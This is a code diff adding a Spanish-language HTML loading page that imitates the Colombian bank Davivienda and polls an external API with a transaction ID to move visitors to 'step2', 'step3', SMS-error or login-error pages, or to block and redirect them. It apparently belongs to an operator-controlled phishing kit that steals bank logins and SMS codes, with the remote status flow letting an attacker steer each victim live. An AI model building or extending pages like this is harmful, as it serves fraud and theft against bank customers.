@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando...</title>
+  <style>
+    @font-face {
+      font-family: 'HelveticaNeueLTStd-Roman';
+      src: url('HelveticaNeueLTStd-Roman.ttf') format('truetype');
+      font-weight: normal;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'HelveticaNeueLTStd-Cn';
+      src: url('HelveticaNeueLTStd-Cn.woff') format('woff');
+      font-weight: normal;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'FontAwesome';
+      src: url('fontawesome-webfont.woff2') format('woff2');
+      font-weight: normal;
+      font-style: normal;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'HelveticaNeueLTStd-Roman', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      background-color: #f7f7f7;
+      color: #333;
+      overflow-x: hidden;
+    }
+
+    /* Fondo original */
+    .background-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 65% 45%, rgba(240, 230, 225, 0.5) 0%, rgba(255, 255, 255, 0.95) 60%),
+        radial-gradient(circle at 20% 70%, rgba(235, 235, 240, 0.4) 0%, rgba(255, 255, 255, 0.9) 70%);
+      filter: blur(10px);
+      z-index: -1;
+    }
+
+    /* Overlay oscuro sobre la página */
+    .blockoverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgb(0, 0, 0);
+      opacity: 0.6;
+      z-index: 998;
+    }
+
+    /* Caja blanca flotante estilo píldora para el cargando */
+    .loading-box-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      pointer-events: none;
+    }
+
+    .loading-modal {
+      background-color: #ffffff;
+      padding: 10px 30px 10px 15px;
+      border-radius: 9999px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.25);
+      display: inline-flex;
+      align-items: center;
+      gap: 11px;
+      pointer-events: auto;
+    }
+
+    .spinner-icon {
+      width: 27px;
+      height: 27px;
+      background-image: url('spinner-davi.png');
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      animation: spin 1s steps(12, end) infinite;
+    }
+
+    .loading-text {
+      font-family: 'HelveticaNeueLTStd-Cn', sans-serif;
+      font-size: 13px;
+      font-weight: bold;
+      color: #000000;
+      letter-spacing: -0.2px;
+      white-space: nowrap;
+    }
+
+    @keyframes spin {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Barra superior roja */
+    header {
+      background-color: #e30613; /* Rojo Davivienda */
+      height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 40px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      position: relative;
+      z-index: 10;
+    }
+
+    .header-logo {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .header-logo img {
+      height: 34px;
+      width: auto;
+      display: block;
+      object-fit: contain;
+    }
+
+    .lang-switcher {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: normal;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .lang-switcher .fa,
+    .lang-switcher .fa-language {
+      font-family: 'FontAwesome';
+      font-style: normal;
+      font-size: 17px;
+      line-height: 1;
+    }
+
+    .lang-switcher .fa-language::before {
+      content: "\f1ab"; /* fa-language */
+    }
+
+    /* Contenido central */
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px 20px;
+      z-index: 1;
+    }
+
+    /* Footer inferior */
+    footer {
+      background-color: #000000;
+      color: #ffffff;
+      font-size: 12px;
+      padding: 12px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .footer-left {
+      display: flex;
+      gap: 15px;
+    }
+
+    .footer-right {
+      color: #ffffff;
+    }
+
+    @media (max-width: 600px) {
+      header {
+        padding: 0 20px;
+      }
+
+      footer {
+        flex-direction: column;
+        gap: 6px;
+        text-align: center;
+        padding: 15px;
+      }
+    }
+  </style>
+  <!-- Configuración externa -->
+  <script src="config.js"></script>
+</head>
+
+<body>
+  <!-- Overlay oscuro con las propiedades solicitadas -->
+  <div class="blockoverlay"></div>
+
+  <!-- Diálogo estilo píldora con spinner Davivienda y texto -->
+  <div class="loading-box-wrapper">
+    <div class="loading-modal">
+      <div class="spinner-icon"></div>
+      <span class="loading-text">Espere por favor...</span>
+    </div>
+  </div>
+
+  <div class="background-overlay"></div>
+
+  <!-- Header -->
+  <header>
+    <a href="#" class="header-logo">
+      <img src="logo.png" alt="Davivienda" />
+    </a>
+    <a href="#" class="lang-switcher">
+      <i class="fa fa-language" aria-hidden="true"></i>
+      <span>English</span>
+    </a>
+  </header>
+
+  <!-- Contenedor Principal (sin auth-container) -->
+  <main>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-left">
+      <span>- © 2026</span>
+      <span>|</span>
+      <span>- Todos los derechos reservados</span>
+    </div>
+    <div class="footer-right">
+      <span>Versión: 11</span>
+    </div>
+  </footer>
+
+  <script>
+    (function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const txId = urlParams.get('tx_id');
+
+      if (!txId) {
+        console.warn('No tx_id proporcionado en la URL.');
+        return;
+      }
+
+      // Intervalo de Polling cada 2 segundos
+      const POLL_INTERVAL = 2000;
+
+      async function checkStatus() {
+        try {
+          const apiUrl = (typeof CONFIG !== 'undefined' && CONFIG.API_URL) ? CONFIG.API_URL : '';
+          const response = await fetch(`${apiUrl}/api/status?tx_id=${encodeURIComponent(txId)}`);
+          if (!response.ok) return;
+
+          const data = await response.json();
+          const status = data.status;
+
+          console.log(`[POLLING] Tx: ${txId} | Estado: ${status}`);
+
+          if (status === 'step2' || status === 'aprobado_step2') {
+            clearInterval(pollTimer);
+            window.location.href = `step2.html?tx_id=${encodeURIComponent(txId)}`;
+          } else if (status === 'step3' || status === 'aprobado_step3') {
+            clearInterval(pollTimer);
+            window.location.href = `step3.html?tx_id=${encodeURIComponent(txId)}`;
+          } else if (status === 'error_logo') {
+            clearInterval(pollTimer);
+            window.location.href = `index.html?tx_id=${encodeURIComponent(txId)}&error=logo`;
+          } else if (status === 'error_sms') {
+            clearInterval(pollTimer);
+            window.location.href = `step2.html?tx_id=${encodeURIComponent(txId)}&error=sms`;
+          } else if (status === 'bloqueo') {
+            clearInterval(pollTimer);
+            localStorage.setItem('user_blocked', 'true');
+            window.location.href = 'https://www.google.com';
+          } else if (status === 'error') {
+            clearInterval(pollTimer);
+            window.location.href = `index.html?tx_id=${encodeURIComponent(txId)}&error=logo`;
+          } else if (status === 'finalizado') {
+            clearInterval(pollTimer);
+            alert('Operación procesada con éxito.');
+          }
+        } catch (error) {
+          console.error('Error durante polling:', error);
+        }
+      }
+
+      // Ejecutar inmediatamente y luego periódicamente
+      checkStatus();
+      const pollTimer = setInterval(checkStatus, POLL_INTERVAL);
+    })();
+  </script>
+</body>
+
+</html>
+
